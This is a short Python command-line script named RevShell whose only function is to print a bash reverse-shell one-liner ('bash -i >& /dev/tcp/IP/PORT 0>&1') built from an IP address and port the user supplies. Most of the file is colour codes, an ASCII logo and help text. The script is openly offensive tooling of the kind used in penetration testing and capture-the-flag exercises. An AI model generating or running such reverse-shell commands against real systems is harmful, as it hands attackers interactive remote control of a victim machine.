#!/usr/bin/python3
# -*- coding: utf-8 -*-

#[*] Name of the tool: RevShell
#[*] Description: Print the code of a reverse shell.
#[*] Version: 1.1
#[*] Author: JRIC2002
#[*] Date of creation: 10/05/2020

#Modules

#External modules
import ipaddress
import sys

class Color:
    """ Colores en código ANSI. """

    #Foreground
    blackColor = "\033[0;30m"
    grayColor = "\033[1;30m"
    redColor = "\033[1;31m"
    greenColor = "\033[1;32m"
    yellowColor = "\033[1;33m"
    blueColor = "\033[1;34m"
    purpleColor = "\033[1;35m"
    cyanColor = "\033[1;36m"
    whiteColor = "\033[1;37m"
    resetColor = "\033[0;0m"

    #Background
    blackBackColor = "\033[0;40m"
    grayBackColor = "\033[1;40m"
    redBackColor = "\033[1;41m"
    greenBackColor = "\033[1;42m"
    yellowBackColor = "\033[1;43m"
    blueBackColor = "\033[1;44m"
    purpleBackColor = "\033[1;45m"
    cyanBackColor = "\033[1;46m"
    whiteBackColor = "\033[1;47m"
    resetBackColor = "\033[0;0m"

#Instancia de la clase Color
color = Color()

class Start:
    """ Inicio de la herramienta RevShell. """

    def __init__(self):
        """ Variables de instancia. """
        pass

    def logo(self):
        """ Imprime el logo de la herramienta RevShell. """

        print("")
        print("   {}__________              {}_________.__           .__  .__ ".format(color.blueColor, color.greenColor))
        print("   {}\______   \ _______  __{}/   _____/|  |__   ____ |  | |  | ".format(color.blueColor, color.greenColor))
        print("    {}|       _// __ \  \/ /{}\_____  \ |  |  \_/ __ \|  | |  | ".format(color.blueColor, color.greenColor))
        print("    {}|    |   \  ___/\   / {}/        \|   Y  \  ___/|  |_|  |__ ".format(color.blueColor, color.greenColor))
        print("    {}|____|_  /\___  >\_/ {}/_______  /|___|  /\___  >____/____/ ".format(color.blueColor, color.greenColor))
        print("            {}\/     \/             {}\/      \/     \/ ".format(color.blueColor, color.greenColor))
        print("     {}[{}~{}]           {}Tool created by: {}JRIC2002            {}[{}~{}]".format(color.whiteColor, color.greenColor, color.whiteColor, color.yellowColor, color.whiteColor, color.whiteColor, color.greenColor, color.whiteColor))
        print("     {}[{}~{}] {}Description: {}Print the code of a reverse shell {}[{}~{}]".format(color.whiteColor, color.greenColor, color.whiteColor, color.yellowColor, color.whiteColor, color.whiteColor, color.greenColor, color.whiteColor))
        print("     \___________________----^_^----____________________/")
        print("{}".format(color.resetColor))

    def help_menu(self):
        """ Imprime el menú de ayuda de la herramienta RevShell. """

        print("{}Usage: python3 RevShell.py [options]".format(color.whiteColor))
        print("       python3 RevShell.py <IP> <PORT>")
        print("")
        print("Options:")
        print("   -h, --help              Show this help message and exit.")
        print("   -v, --version           Show program's version number and exit.{}".format(color.resetColor))

    def version(self):
        """ Imprime la versión de la herramienta RevShell. """

        print("{}#RevShell version 1.1{}".format(color.whiteColor, color.resetColor))

    def error(self):
        """ Imprime un mensaje de error. """

        print("{}Usage: python3 RevShell.py [options]".format(color.whiteColor))
        print("       python3 RevShell.py <IP> <PORT>")
        print("")
        print("RevShell.py: Error: Invalid option.")
        print("Use -h or --help to see the help menu.{}".format(color.resetColor))

#Instancia de la clase Start
start = Start()

class Functions:
    """ Funcionalidades de ma herramienta RevShell. """

    def __init__(self):
        """ Variables de instancia. """
        pass

    def verify(self, ip, port):
        """ Verifica la dirección IP y el Puerto."""
        
        try:
            ipaddress.ip_address(ip)
            try:
                if int(port) >= 1 and int(port) <= 65535:
                    pass
                else:
                    raise Exception
            except Exception:
                print("{}Error: Invalid port.{}".format(color.redColor, color.whiteColor))
                sys.exit(1)
        except Exception:
            print("{}Error: Invalid IP.{}".format(color.redColor, color.resetColor))
            sys.exit(1)

    def rev_shell(self, ip, port):
        """ Imprime reverse shells. """
        
        a = "bash -i >& /dev/tcp/{}/{} 0>&1".format(ip, port)
        b = "More reverse shells"

        for code in (a, b):
            print("{}[{}*{}] ".format(color.whiteColor, color.greenColor, color.whiteColor) + code)
        print("{}".format(color.resetColor))

#Instancia de la clase Functions
functions = Functions()

#Start
if len(sys.argv) == 1:
    start.logo()
    start.help_menu()
elif len(sys.argv) == 2:
    if sys.argv[1] == "-h" or sys.argv[1] == "--help":
        start.logo()
        start.help_menu()
    elif sys.argv[1] == "-v" or sys.argv[1] == "--version":
        start.version()
    else:
        start.logo()
        start.error()
elif len(sys.argv) == 3:
    start.logo()
    functions.verify(sys.argv[1], sys.argv[2])
    functions.rev_shell(sys.argv[1], sys.argv[2])
else:
    start.logo()
    start.error()
